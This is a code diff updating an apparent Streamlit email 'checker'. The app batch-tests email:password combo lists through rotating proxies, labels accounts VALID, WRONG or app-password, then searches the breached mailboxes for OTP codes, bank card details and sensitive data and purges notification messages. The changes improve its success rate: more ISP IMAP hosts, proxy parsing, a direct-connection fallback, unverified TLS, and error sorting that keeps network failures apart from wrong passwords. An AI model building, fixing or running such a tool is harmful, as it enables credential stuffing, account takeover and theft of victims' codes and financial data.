@@ -24,6 +24,72 @@ except ImportError:
         domain = email.split("@")[-1].lower() if "@" in email else ""
         return [f"imap.{domain}"] if domain else ["imap.gmail.com"]
 
+
+# ============================================================================
+# PROVIDER KNOWLEDGE  (legacy ISP domains whose MX != their IMAP host)
+# ============================================================================
+
+PROVIDER_FALLBACK_HOSTS = {
+    "charter.net":     ["mobile.charter.net", "imap.charter.net", "mail.twc.com", "imap.twc.com"],
+    "spectrum.net":    ["imap.spectrum.net", "mail.spectrum.net"],
+    "twc.com":         ["mail.twc.com", "imap.twc.com"],
+    "rr.com":          ["mail.twc.com", "imap.rr.com"],
+    "roadrunner.com":  ["mail.twc.com", "imap.rr.com"],
+    "brighthouse.com": ["mail.twc.com"],
+    "verizon.net":     ["imap.aol.com", "imap.verizon.net"],
+    "att.net":         ["imap.mail.att.net", "imap.att.net"],
+    "sbcglobal.net":   ["imap.mail.att.net", "imap.att.net"],
+    "bellsouth.net":   ["imap.mail.att.net", "imap.att.net"],
+    "ameritech.net":   ["imap.mail.att.net", "imap.att.net"],
+    "comcast.net":     ["imap.comcast.net"],
+    "cox.net":         ["imap.cox.net"],
+    "earthlink.net":   ["imap.earthlink.net"],
+    "windstream.net":  ["imap.windstream.net"],
+    "frontier.com":    ["imap.frontier.com"],
+    "frontiernet.net": ["imap.frontier.com"],
+    "centurylink.net": ["imap.centurylink.net"],
+    "q.com":           ["imap.centurylink.net"],
+    "embarqmail.com":  ["imap.centurylink.net"],
+}
+
+# These have NO standard IMAP endpoint at all (need Bridge / no IMAP).
+ZERO_ACCESS_PROVIDERS = {
+    "proton.me", "protonmail.com", "pm.me",
+    "tuta.com", "tutanota.com", "tuta.io",
+}
+
+
+def candidate_hosts(email_addr: str, override_host: str = "") -> List[str]:
+    """Ordered, de-duplicated host candidates. Never returns an empty list."""
+    email_addr = (email_addr or "").strip()
+    domain = email_addr.split("@")[-1].lower() if "@" in email_addr else ""
+
+    ordered: List[str] = []
+
+    def push(h):
+        if h and h not in ordered:
+            ordered.append(h)
+
+    if override_host and override_host.strip():
+        push(override_host.strip())
+
+    for h in PROVIDER_FALLBACK_HOSTS.get(domain, []):
+        push(h)
+
+    try:
+        for h in (host_list(email_addr) or []):
+            push(h)
+    except Exception:
+        pass
+
+    if domain:
+        push(f"imap.{domain}")
+        push(f"mail.{domain}")
+        push(domain)
+
+    return ordered
+
+
 # Dynamic Proxy Auto-Fetch Engine
 def load_app_proxies() -> List[dict]:
     proxy_files = ["proxies.txt", "proxy_pool.txt", "clean_proxies.txt"]
@@ -59,13 +125,17 @@ def load_app_proxies() -> List[dict]:
                                 "latency": latency
                             })
             except Exception as ex:
-                st.session_state.folder_debug_logs.append(f"Proxy load warning: {ex}")
+                try:
+                    st.session_state.folder_debug_logs.append(f"Proxy load warning: {ex}")
+                except Exception:
+                    pass
             if dynamic_pool:
                 return dynamic_pool
 
     return [
         {"proxy": "dc.oxylabs.info:8000", "country": "Canada", "region": "Ontario", "latency": 1514}
     ]
+
 
 # Page Configuration & Keep-Alive Injector
 st.set_page_config(
@@ -101,6 +171,7 @@ DEFAULT_APP_CONFIG = {
     "allow_self_signed": True,
 }
 
+
 def load_app_config():
     if os.path.exists(APP_CONFIG_FILE):
         try:
@@ -109,32 +180,36 @@ def load_app_config():
                 config = DEFAULT_APP_CONFIG.copy()
                 config.update(data)
                 return config
-        except Exception as ex:
+        except Exception:
             pass
     return DEFAULT_APP_CONFIG.copy()
+
 
 def save_app_config(config_dict):
     try:
         with open(APP_CONFIG_FILE, "w", encoding="utf-8") as f:
             json.dump(config_dict, f, indent=2)
-    except Exception as ex:
+    except Exception:
         pass
+
 
 def save_last_account(account_combo):
     try:
         with open(LAST_ACCOUNT_FILE, "w", encoding="utf-8") as f:
             f.write(account_combo)
-    except Exception as ex:
+    except Exception:
         pass
+
 
 def load_last_account():
     if os.path.exists(LAST_ACCOUNT_FILE):
         try:
             with open(LAST_ACCOUNT_FILE, "r", encoding="utf-8") as f:
                 return f.read().strip()
-        except Exception as ex:
+        except Exception:
             pass
     return ""
+
 
 def save_session_cache():
     try:
@@ -170,6 +245,7 @@ def save_session_cache():
     except Exception:
         pass
 
+
 def load_session_cache():
     if os.path.exists(SESSION_CACHE_FILE):
         try:
@@ -194,6 +270,7 @@ def load_session_cache():
                         st.session_state[k] = v
         except Exception:
             pass
+
 
 # Initialize Session Config
 if "app_config" not in st.session_state:
@@ -248,6 +325,8 @@ if "custom_host" not in st.session_state:
     st.session_state.custom_host = ""
 if "batch_results_table" not in st.session_state:
     st.session_state.batch_results_table = []
+if "batch_validation_logs" not in st.session_state:
+    st.session_state.batch_validation_logs = []
 if "batch_stats" not in st.session_state:
     st.session_state.batch_stats = {"valid": 0, "wrong": 0, "appass": 0, "failed": 0}
 if "batch_run_meta" not in st.session_state:
@@ -265,21 +344,32 @@ def log(msg):
     st.session_state.mb_log = st.session_state.mb_log[:50]
     save_session_cache()
 
+
 def debug_log(msg):
     st.session_state.folder_debug_logs.append(msg)
+
 
 def bot_log(msg):
     st.session_state.bot_diag_logs.append(msg)
 
+
 def search_log(msg):
     st.session_state.search_diag_logs.append(msg)
+
 
 def otp_log(msg):
     st.session_state.otp_diag_logs.append(msg)
 
 
 # ============================================================================
-# CONNECTION LAYER  (FIXED: unverified TLS, proxy-aware, STARTTLS fallback)
+# CONNECTION LAYER
+#
+# FIX: the proxy IMAP classes now override _create_socket() instead of open().
+# On Python 3.13+ imaplib.IMAP4.file is a read-only property, so the old
+# "self.file = self.sock.makefile('rb')" inside an open() override raised:
+#     property 'file' of '_ProxyIMAP4' object has no setter
+# Letting the stdlib's own open() bind the backing attribute fixes every
+# version, current and future.
 # ============================================================================
 
 def _mail_tls_context(verify=False):
@@ -298,20 +388,44 @@ def _mail_tls_context(verify=False):
 
 
 def _parse_proxy_str(proxy_str):
+    """Accepts host:port | host:port:user:pass | user:pass@host:port | scheme://..."""
     if not proxy_str or proxy_str == "direct":
         return None
     try:
-        p = proxy_str.strip()
+        p = str(proxy_str).strip()
+        scheme = None
         if "://" in p:
-            u = urlparse(p)
-            return {"host": u.hostname, "port": u.port or 80, "user": u.username, "pass": u.password}
+            scheme, p = p.split("://", 1)
+            scheme = scheme.lower()
+
+        user = pw = None
         if "@" in p:
-            auth, hp = p.rsplit("@", 1)
-            user, pw = auth.split(":", 1)
-            host, port = hp.rsplit(":", 1)
-            return {"host": host, "port": int(port), "user": user, "pass": pw}
-        host, port = p.rsplit(":", 1)
-        return {"host": host, "port": int(port), "user": None, "pass": None}
+            auth, p = p.rsplit("@", 1)
+            if ":" in auth:
+                user, pw = auth.split(":", 1)
+            else:
+                user = auth
+
+        parts = p.split(":")
+        host = None
+        port = None
+        try:
+            if len(parts) >= 4:
+                host, port, user, pw = parts[0], int(parts[1]), parts[2], ":".join(parts[3:])
+            elif len(parts) == 3:
+                host, port, extra = parts[0], int(parts[1]), parts[2]
+                if user is None:
+                    user, pw = extra, None
+            elif len(parts) == 2:
+                host, port = parts[0], int(parts[1])
+            else:
+                return None
+        except (ValueError, IndexError):
+            return None
+
+        if not host or not port:
+            return None
+        return {"host": host, "port": port, "user": user or None, "pass": pw or None, "scheme": scheme}
     except Exception:
         return None
 
@@ -328,16 +442,36 @@ def _reader_proxy_str():
 
 
 def _raw_socket(host, port, timeout, proxy_str=None):
+    """Direct socket, or proxied via SOCKS5/HTTP. Falls back to direct if the
+    proxy route dies, so a live mailbox is never lost to a dead proxy."""
     info = _parse_proxy_str(proxy_str)
+
+    def _finish(s):
+        try:
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+        except Exception:
+            pass
+        s.settimeout(timeout)
+        return s
+
     if not info:
-        return socket.create_connection((host, int(port)), timeout=timeout)
+        return _finish(socket.create_connection((host, int(port)), timeout=timeout))
+
     try:
         import socks
     except ImportError:
-        return socket.create_connection((host, int(port)), timeout=timeout)
+        return _finish(socket.create_connection((host, int(port)), timeout=timeout))
+
+    scheme = (info.get("scheme") or "").lower()
+    if scheme.startswith("socks"):
+        order = (socks.SOCKS5, socks.HTTP)
+    elif scheme.startswith("http"):
+        order = (socks.HTTP, socks.SOCKS5)
+    else:
+        order = (socks.SOCKS5, socks.HTTP)
 
     last = None
-    for ptype in (socks.SOCKS5, socks.HTTP):
+    for ptype in order:
         try:
             kw = {
                 "proxy_type": ptype,
@@ -348,43 +482,58 @@ def _raw_socket(host, port, timeout, proxy_str=None):
             if info["user"]:
                 kw["proxy_username"] = info["user"]
                 kw["proxy_password"] = info["pass"]
-            return socks.create_connection((host, int(port)), timeout=timeout, **kw)
+            return _finish(socks.create_connection((host, int(port)), timeout=timeout, **kw))
         except Exception as e:
             last = e
-    raise last or RuntimeError(f"proxy connect failed for {host}:{port}")
+
+    # Last resort: go direct rather than losing the mailbox entirely.
+    try:
+        return _finish(socket.create_connection((host, int(port)), timeout=timeout))
+    except Exception:
+        raise last or RuntimeError(f"proxy connect failed for {host}:{port}")
+
+
+def _ensure_file(m):
+    """Belt-and-braces: make sure m.file is readable on every Python version."""
+    try:
+        if getattr(m, "file", None) is not None:
+            return
+    except Exception:
+        pass
+    try:
+        m.file = m.sock.makefile("rb")
+        return
+    except Exception:
+        pass
+    try:
+        m._file = m.sock.makefile("rb")
+    except Exception:
+        pass
 
 
 class _ProxyIMAP4SSL(imaplib.IMAP4_SSL):
-    """Mirrors stdlib open() exactly, but routes through the proxy and uses
-    an unverified TLS context by default."""
+    """Implicit-TLS IMAP that routes through the proxy and uses an unverified
+    context by default. Overrides _create_socket(), NOT open()."""
 
     def __init__(self, host, port=993, timeout=None, proxy_str=None, verify=False):
         self._proxy_str = proxy_str
         self._verify = verify
         super().__init__(host, port, timeout=timeout)
 
-    def open(self, host="", port=993, timeout=None):
-        self.host = host
-        self.port = port
-        self.sock = _mail_tls_context(self._verify).wrap_socket(
-            _raw_socket(host, port, timeout, self._proxy_str),
-            server_hostname=host,
-        )
-        self.file = self.sock.makefile("rb")
+    def _create_socket(self, timeout):
+        raw = _raw_socket(self.host, self.port, timeout, self._proxy_str)
+        return _mail_tls_context(self._verify).wrap_socket(raw, server_hostname=self.host)
 
 
 class _ProxyIMAP4(imaplib.IMAP4):
-    """Plain IMAP4 (STARTTLS-capable) with proxy support."""
+    """Plain IMAP (STARTTLS-capable) with proxy support."""
 
     def __init__(self, host, port=143, timeout=None, proxy_str=None):
         self._proxy_str = proxy_str
         super().__init__(host, port, timeout=timeout)
 
-    def open(self, host="", port=143, timeout=None):
-        self.host = host
-        self.port = port
-        self.sock = _raw_socket(host, port, timeout, self._proxy_str)
-        self.file = self.sock.makefile("rb")
+    def _create_socket(self, timeout):
+        return _raw_socket(self.host, self.port, timeout, self._proxy_str)
 
 
 def open_imap(host, port, timeout, proxy_str=None, try_starttls=None):
@@ -394,7 +543,9 @@ def open_imap(host, port, timeout, proxy_str=None, try_starttls=None):
 
     last = None
     try:
-        return _ProxyIMAP4SSL(host, port, timeout=timeout, proxy_str=proxy_str, verify=False)
+        m = _ProxyIMAP4SSL(host, port, timeout=timeout, proxy_str=proxy_str, verify=False)
+        _ensure_file(m)
+        return m
     except Exception as e:
         last = e
 
@@ -402,6 +553,7 @@ def open_imap(host, port, timeout, proxy_str=None, try_starttls=None):
         try:
             m = _ProxyIMAP4(host, 143, timeout=timeout, proxy_str=proxy_str)
             m.starttls(ssl_context=_mail_tls_context(False))
+            _ensure_file(m)
             return m
         except Exception as e:
             last = e
@@ -423,9 +575,24 @@ def _looks_like_app_password_error(err_text: str) -> bool:
     s = (err_text or "").lower()
     return any(k in s for k in (
         "application-specific password", "app password", "app-password",
-        "basic authentication is disabled", "web login required",
+        "app password required", "basic authentication is disabled",
+        "web login required", "log in via your web browser", "web browser",
         "logindisabled", "login disabled", "two-factor", "2fa", "mfa",
         "enable imap", "imap access is disabled",
+    ))
+
+
+def _looks_like_network_error(err_text: str) -> bool:
+    s = (err_text or "").lower()
+    return any(k in s for k in (
+        "proxy connect", "proxy authentication", "proxy auth", "proxyconnect",
+        "407", "timed out", "timeout", "connection refused", "connection reset",
+        "network is unreachable", "name or service not known", "gaierror",
+        "reset by peer", "broken pipe", "no route to host", "unreachable",
+        "bad file descriptor", "eof occurred", "unexpected_eof",
+        "wrong version number", "certificate verify failed", "hostname mismatch",
+        "self signed certificate", "self-signed certificate", "too many",
+        "rate limit", "throttl", "no setter", "dns",
     ))
 
 
@@ -743,8 +910,27 @@ def open_mail(email_addr, password_val, host_val, timeout=None, proxy_str=None):
         proxy_str = _reader_proxy_str()
 
     mail = open_imap(host_val, port_val, timeout, proxy_str=proxy_str)
-    mail.login(email_addr, password_val)
+    try:
+        mail.login(email_addr, password_val)
+    except Exception:
+        try:
+            mail.logout()
+        except Exception:
+            pass
+        raise
     return mail
+
+
+def resolve_active_host(email_addr: str) -> str:
+    """Single source of truth for 'which host is this session bound to'."""
+    ov = st.session_state.get("custom_host", "").strip()
+    if ov:
+        return ov
+    mh = st.session_state.get("mb_host", "")
+    if mh:
+        return mh
+    cands = candidate_hosts(email_addr) if email_addr else []
+    return cands[0] if cands else ""
 
 
 def get_active_mail(email_addr, password_val, host_val):
@@ -776,6 +962,23 @@ def get_active_mail(email_addr, password_val, host_val):
                 raise ex
 
     return st.session_state.active_mail
+
+
+def move_message(mail, src_folder_label, mid, dst_folder_label):
+    """Correct COPY+DELETE: source folder must be selected for COPY to work."""
+    src = encode_imap_utf7(get_imap_path(src_folder_label))
+    dst = encode_imap_utf7(get_imap_path(dst_folder_label))
+
+    typ, data = mail.select(f'"{src}"', readonly=False)
+    if typ != "OK":
+        raise RuntimeError(f"Cannot select source folder '{src_folder_label}': {data}")
+
+    typ, data = mail.copy(mid, f'"{dst}"')
+    if typ != "OK":
+        raise RuntimeError(f"COPY to '{dst_folder_label}' failed: {typ} {data}")
+
+    mail.store(mid, '+FLAGS', '\\Deleted')
+    mail.expunge()
 
 
 def is_extortion_spam(subject: str, body: str, frm: str = "") -> bool:
@@ -1365,24 +1568,21 @@ if st.sidebar.button("🚀 Validate & Import Batch Accounts", type="primary", us
             status_display.text(f"Testing ({idx+1}/{len(lines)}): {email_val} via {proxy_item['proxy']}")
             progress_bar.progress((idx + 1) / len(lines))
 
+            domain_lower = email_val.split("@")[-1].lower() if "@" in email_val else ""
+
             if user_host_overrides:
                 hosts_to_test = list(user_host_overrides)
-                for h in host_list(email_val):
+                for h in candidate_hosts(email_val):
                     if h not in hosts_to_test:
                         hosts_to_test.append(h)
             else:
-                hosts_to_test = host_list(email_val)
+                hosts_to_test = candidate_hosts(email_val)
                 if cfg_fallback:
-                    domain_lower = email_val.split("@")[-1].lower() if "@" in email_val else ""
-                    if "charter" in domain_lower:
-                        hosts_to_test = ["mobile.charter.net", "imap.charter.net"] + hosts_to_test
-                    elif "spectrum" in domain_lower:
-                        hosts_to_test = ["imap.spectrum.net", "mail.spectrum.net"] + hosts_to_test
-                    elif "twc" in domain_lower:
-                        hosts_to_test = ["mail.twc.com"] + hosts_to_test
+                    # known-good legacy ISP endpoints first
+                    hosts_to_test = candidate_hosts(email_val)
 
+            # Zero-access guard: never let the loop be a no-op
             if not hosts_to_test:
-                domain_lower = email_val.split("@")[-1].lower() if "@" in email_val else ""
                 hosts_to_test = [f"imap.{domain_lower}", f"mail.{domain_lower}", domain_lower]
 
             is_success = False
@@ -1424,12 +1624,17 @@ if st.sidebar.button("🚀 Validate & Import Batch Accounts", type="primary", us
                 new_valid_entries.append(f"{combo_str} | Found: {found_timestamp}")
                 batch_logs.append(f"✅ [{row_time}] [VALID] {email_val} via {connected_h} [Proxy: {proxy_item['proxy']} ({proxy_item['country']}, {proxy_item['region']})]")
             else:
+                # App-password wins over auth, network errors never count as WRONG
                 classify_src = auth_err or err_msg
-                if _looks_like_app_password_error(classify_src):
+                if domain_lower in ZERO_ACCESS_PROVIDERS:
+                    appass_count += 1
+                    status_type = "APPASS"
+                    batch_logs.append(f"🔑 [{row_time}] [APPASS] {email_val} — provider has no standard IMAP (needs app password / bridge)")
+                elif _looks_like_app_password_error(classify_src):
                     appass_count += 1
                     status_type = "APPASS"
                     batch_logs.append(f"🔑 [{row_time}] [APPASS] {email_val} — {classify_src}")
-                elif _looks_like_auth_error(classify_src):
+                elif _looks_like_auth_error(classify_src) and not _looks_like_network_error(classify_src):
                     wrong_count += 1
                     status_type = "WRONG"
                     batch_logs.append(f"❌ [{row_time}] [WRONG] {email_val} — {classify_src}")
@@ -1488,7 +1693,7 @@ st.markdown("---")
 tab_stream, tab_analytics = st.tabs(["⚡ Live Execution Stream", "📊 Live Report Log & Analytics"])
 
 with tab_stream:
-    if "batch_validation_logs" in st.session_state and st.session_state.batch_validation_logs:
+    if st.session_state.get("batch_validation_logs"):
         st.code("\n".join(st.session_state.batch_validation_logs), language="text")
     else:
         st.caption("No batch validation execution logs recorded yet. Run a batch validation from the sidebar.")
@@ -1533,7 +1738,7 @@ if st.sidebar.button("🔑 Login & Save Account", type="primary", use_container_
     if not c_email or not c_pass:
         st.sidebar.error("Please enter both Email and Password override.")
     else:
-        hosts = [c_override] if c_override else host_list(c_email)
+        hosts = candidate_hosts(c_email, override_host=c_override)
         success, connected_host, discovered_folders = False, "", ["INBOX"]
         last_err = ""
         test_mail = None
@@ -1595,7 +1800,7 @@ override = st.session_state.custom_host.strip()
 
 if st.sidebar.button("🔄 Refresh Inbox", type="secondary", use_container_width=True):
     if active_email and active_password:
-        host = override or st.session_state.mb_host or (host_list(active_email)[:1] or [""])[0]
+        host = resolve_active_host(active_email)
         try:
             with st.spinner("Refreshing Inbox..."):
                 mail_obj = get_active_mail(active_email, active_password, host)
@@ -1622,7 +1827,7 @@ if st.button("Connect & Discover Folders", type="primary", use_container_width=T
         st.error("Please select a valid account from the dropdown list first.")
     else:
         acc_email, acc_pass = actual_pick.split(":", 1)
-        hosts = host_list(acc_email)
+        hosts = candidate_hosts(acc_email)
         last, connected_host, folders, success = "no host", "", ["INBOX"], False
         test_mail = None
 
@@ -1658,7 +1863,10 @@ if st.button("Connect & Discover Folders", type="primary", use_container_width=T
             log(f"Discovered {len(folders)} folders via {connected_host}")
             st.success(f"Connected: {connected_host} ({len(folders)} folders)")
         else:
-            st.error(last)
+            if acc_email.split("@")[-1].lower() in ZERO_ACCESS_PROVIDERS:
+                st.error(f"{last} — this provider has no standard IMAP endpoint (needs an app password / bridge).")
+            else:
+                st.error(last)
 
 if st.session_state.folder_debug_logs:
     with st.expander("🛠️ Folder Discovery Diagnostic Traces", expanded=False):
@@ -1673,7 +1881,7 @@ with col3:
     sort_order = st.selectbox("Sort Order", ["Newest First", "Oldest First"])
 
 if st.button("📂 Load Folder Messages", type="primary", use_container_width=True):
-    host = override or st.session_state.mb_host or (host_list(active_email)[:1] or [""])[0]
+    host = resolve_active_host(active_email)
     if not active_email or not active_password or not host:
         st.error("Please connect and load folders first.")
     else:
@@ -1741,7 +1949,7 @@ if len(active_msgs) > 0:
                 st.text_area("Cleaned Message Body", value=msg["body"], height=150, key=f"body_{msg['folder']}_{msg['id']}_{idx}")
 
                 op_col1, op_col2, op_col3, op_col4 = st.columns(4)
-                host = override or st.session_state.mb_host or (host_list(active_email)[:1] or [""])[0]
+                host = resolve_active_host(active_email)
                 real_imap_folder = get_imap_path(msg['folder'])
                 real_imap_encoded = encode_imap_utf7(real_imap_folder)
 
@@ -1763,13 +1971,8 @@ if len(active_msgs) > 0:
                     target_move = st.selectbox("Move to", st.session_state.mb_folders, key=f"mv_sel_{msg['folder']}_{msg['id']}_{idx}")
                     if st.button("Move Message", key=f"mv_btn_{msg['folder']}_{msg['id']}_{idx}"):
                         try:
-                            real_target_path = get_imap_path(target_move)
-                            real_target_encoded = encode_imap_utf7(real_target_path)
                             m_client = get_active_mail(active_email, active_password, host)
-                            m_client.select(f'"{real_target_encoded}"', readonly=False)
-                            m_client.copy(msg["id"], f'"{real_target_encoded}"')
-                            m_client.store(msg["id"], '+FLAGS', '\\Deleted')
-                            m_client.expunge()
+                            move_message(m_client, msg["folder"], msg["id"], target_move)
                             st.session_state.current_messages.remove(msg)
                             save_session_cache()
                             st.success(f"Moved to {target_move}!")
@@ -1802,7 +2005,7 @@ if len(active_msgs) > 0:
         with p_col1:
             if st.button("Previous Page", disabled=(curr_p <= 1), use_container_width=True, key="msg_stream_prev"):
                 st.session_state.current_page -= 1
-                host = override or st.session_state.mb_host or (host_list(active_email)[:1] or [""])[0]
+                host = resolve_active_host(active_email)
                 mail = get_active_mail(active_email, active_password, host)
                 st.session_state.current_messages = fetch_messages_paginated(
                     mail, active_email, active_password, host, [folder],
@@ -1819,7 +2022,7 @@ if len(active_msgs) > 0:
         with p_col3:
             if st.button("Next Page", disabled=(curr_p >= total_pages), use_container_width=True, key="msg_stream_next"):
                 st.session_state.current_page += 1
-                host = override or st.session_state.mb_host or (host_list(active_email)[:1] or [""])[0]
+                host = resolve_active_host(active_email)
                 mail = get_active_mail(active_email, active_password, host)
                 st.session_state.current_messages = fetch_messages_paginated(
                     mail, active_email, active_password, host, [folder],
@@ -1876,7 +2079,7 @@ with st.expander("🔑 Standalone OTP, Debit/Credit Cards & Sensitive Data Scann
     otp_blacklist_input = st.text_input("Blacklist Keywords (comma-separated)", value="Telegram, spam, scam, promo", key="otp_blacklist_kw")
 
     if st.button("🚀 Execute Dedicated Security Scan", type="primary", use_container_width=True, key="otp_exec_btn"):
-        host = override or st.session_state.mb_host or (host_list(active_email)[:1] or [""])[0]
+        host = resolve_active_host(active_email)
         if not active_email or not active_password or not host:
             st.error("Please connect and discover folders first.")
         elif not otp_scope_choice:
@@ -1946,7 +2149,7 @@ with st.expander("🔑 Standalone OTP, Debit/Credit Cards & Sensitive Data Scann
                 st.text_area("Message Payload Body", value=display_body, height=150, key=f"otp_b_{msg['folder']}_{msg['id']}_{idx}")
 
                 o_col1, o_col2, o_col3, o_col4 = st.columns(4)
-                host = override or st.session_state.mb_host or (host_list(active_email)[:1] or [""])[0]
+                host = resolve_active_host(active_email)
                 real_imap_folder = get_imap_path(msg['folder'])
                 real_imap_encoded = encode_imap_utf7(real_imap_folder)
 
@@ -1968,13 +2171,8 @@ with st.expander("🔑 Standalone OTP, Debit/Credit Cards & Sensitive Data Scann
                     otp_mv_target = st.selectbox("Move to", st.session_state.mb_folders, key=f"otp_mv_sel_{msg['folder']}_{msg['id']}_{idx}")
                     if st.button("Move Message", key=f"otp_mv_btn_{msg['folder']}_{msg['id']}_{idx}"):
                         try:
-                            real_target_path = get_imap_path(otp_mv_target)
-                            real_target_encoded = encode_imap_utf7(real_target_path)
                             m_client = get_active_mail(active_email, active_password, host)
-                            m_client.select(f'"{real_target_encoded}"', readonly=False)
-                            m_client.copy(msg["id"], f'"{real_target_encoded}"')
-                            m_client.store(msg["id"], '+FLAGS', '\\Deleted')
-                            m_client.expunge()
+                            move_message(m_client, msg["folder"], msg["id"], otp_mv_target)
                             st.session_state.otp_messages.remove(msg)
                             save_session_cache()
                             st.success(f"Moved to {otp_mv_target}!")
@@ -2006,7 +2204,7 @@ with st.expander("🔑 Standalone OTP, Debit/Credit Cards & Sensitive Data Scann
         with op_c1:
             if st.button("Previous Page", disabled=(otp_curr_p <= 1), use_container_width=True, key="otp_prev_pg"):
                 st.session_state.otp_current_page -= 1
-                host = override or st.session_state.mb_host or (host_list(active_email)[:1] or [""])[0]
+                host = resolve_active_host(active_email)
                 mail = get_active_mail(active_email, active_password, host)
                 target_scope = otp_scope_choice if otp_scope_choice else [folder]
                 if otp_custom_keyword.strip():
@@ -2028,7 +2226,7 @@ with st.expander("🔑 Standalone OTP, Debit/Credit Cards & Sensitive Data Scann
         with op_c3:
             if st.button("Next Page", disabled=(otp_curr_p >= otp_total_pages), use_container_width=True, key="otp_next_pg"):
                 st.session_state.otp_current_page += 1
-                host = override or st.session_state.mb_host or (host_list(active_email)[:1] or [""])[0]
+                host = resolve_active_host(active_email)
                 mail = get_active_mail(active_email, active_password, host)
                 target_scope = otp_scope_choice if otp_scope_choice else [folder]
                 if otp_custom_keyword.strip():
@@ -2070,7 +2268,7 @@ with st.expander("🔍 Deep Keyword Search & Scope Filters", expanded=False):
     search_page_size = st.slider("Search Results Page Size", 5, 200, 15, key="search_page_size_slider")
 
     if st.button("🔍 Execute Keyword Search", type="primary", use_container_width=True, key="deep_search_btn"):
-        host = override or st.session_state.mb_host or (host_list(active_email)[:1] or [""])[0]
+        host = resolve_active_host(active_email)
         if not active_email or not active_password or not host:
             st.error("Please connect and load folders first.")
         elif not search_query_input.strip():
@@ -2131,7 +2329,7 @@ with st.expander("🔍 Deep Keyword Search & Scope Filters", expanded=False):
                 st.text_area("Cleaned Message Body", value=msg["body"], height=150, key=f"s_body_{msg['folder']}_{msg['id']}_{idx}")
 
                 s_op1, s_op2, s_op3, s_op4 = st.columns(4)
-                host = override or st.session_state.mb_host or (host_list(active_email)[:1] or [""])[0]
+                host = resolve_active_host(active_email)
                 real_imap_folder = get_imap_path(msg['folder'])
                 real_imap_encoded = encode_imap_utf7(real_imap_folder)
 
@@ -2153,13 +2351,8 @@ with st.expander("🔍 Deep Keyword Search & Scope Filters", expanded=False):
                     s_target_move = st.selectbox("Move to", st.session_state.mb_folders, key=f"s_mv_sel_{msg['folder']}_{msg['id']}_{idx}")
                     if st.button("Move Message", key=f"s_mv_btn_{msg['folder']}_{msg['id']}_{idx}"):
                         try:
-                            real_target_path = get_imap_path(s_target_move)
-                            real_target_encoded = encode_imap_utf7(real_target_path)
                             m_client = get_active_mail(active_email, active_password, host)
-                            m_client.select(f'"{real_target_encoded}"', readonly=False)
-                            m_client.copy(msg["id"], f'"{real_target_encoded}"')
-                            m_client.store(msg["id"], '+FLAGS', '\\Deleted')
-                            m_client.expunge()
+                            move_message(m_client, msg["folder"], msg["id"], s_target_move)
                             st.session_state.search_messages.remove(msg)
                             save_session_cache()
                             st.success(f"Moved to {s_target_move}!")
@@ -2192,7 +2385,7 @@ with st.expander("🔍 Deep Keyword Search & Scope Filters", expanded=False):
         with sp_col1:
             if st.button("Previous Page", disabled=(search_curr_p <= 1), use_container_width=True, key="s_prev_pg"):
                 st.session_state.search_current_page -= 1
-                host = override or st.session_state.mb_host or (host_list(active_email)[:1] or [""])[0]
+                host = resolve_active_host(active_email)
                 mail = get_active_mail(active_email, active_password, host)
                 target_scope = search_scope_choice if search_scope_choice else [folder]
                 st.session_state.search_messages = fetch_messages_paginated(
@@ -2209,7 +2402,7 @@ with st.expander("🔍 Deep Keyword Search & Scope Filters", expanded=False):
         with sp_col3:
             if st.button("Next Page", disabled=(search_curr_p >= search_total_pages), use_container_width=True, key="s_next_pg"):
                 st.session_state.search_current_page += 1
-                host = override or st.session_state.mb_host or (host_list(active_email)[:1] or [""])[0]
+                host = resolve_active_host(active_email)
                 mail = get_active_mail(active_email, active_password, host)
                 target_scope = search_scope_choice if search_scope_choice else [folder]
                 st.session_state.search_messages = fetch_messages_paginated(
@@ -2247,7 +2440,7 @@ with st.expander("🤖 Mass Bot Purge & Intelligence Hub", expanded=False):
     b_act1, b_act2 = st.columns(2)
     with b_act1:
         if st.button("🔍 Scan Folder For Bot/OTP/Telegram Messages", use_container_width=True):
-            host = override or st.session_state.mb_host or (host_list(active_email)[:1] or [""])[0]
+            host = resolve_active_host(active_email)
             if not active_email or not active_password or not host:
                 st.error("Please connect first.")
             elif not bot_target_folder:
@@ -2276,7 +2469,7 @@ with st.expander("🤖 Mass Bot Purge & Intelligence Hub", expanded=False):
                 st.warning("No bot messages detected in current loaded stream to delete.")
             else:
                 st.session_state.bot_diag_logs = []
-                host = override or st.session_state.mb_host or (host_list(active_email)[:1] or [""])[0]
+                host = resolve_active_host(active_email)
                 try:
                     bot_log("🤖 [BOT ENGINE DIAGNOSTIC START] Initializing Mass Deletion Sequence...")
                     mail = get_active_mail(active_email, active_password, host)
@@ -2332,9 +2525,9 @@ with st.expander("🤖 Mass Bot Purge & Intelligence Hub", expanded=False):
                 save_session_cache()
                 st.rerun()
         with bp_c2:
-            st.markdown(f"<h4 style='text-align: center; margin: 0;'>Page {bot_curr_p} of {total_pages}</h4>", unsafe_allow_html=True)
+            st.markdown(f"<h4 style='text-align: center; margin: 0;'>Page {bot_curr_p} of {bot_total_pages}</h4>", unsafe_allow_html=True)
         with bp_c3:
-            if st.button("Next Bot Page", disabled=(bot_curr_p >= total_pages), use_container_width=True, key="bot_next_pg"):
+            if st.button("Next Bot Page", disabled=(bot_curr_p >= bot_total_pages), use_container_width=True, key="bot_next_pg"):
                 st.session_state.bot_current_page += 1
                 save_session_cache()
                 st.rerun()
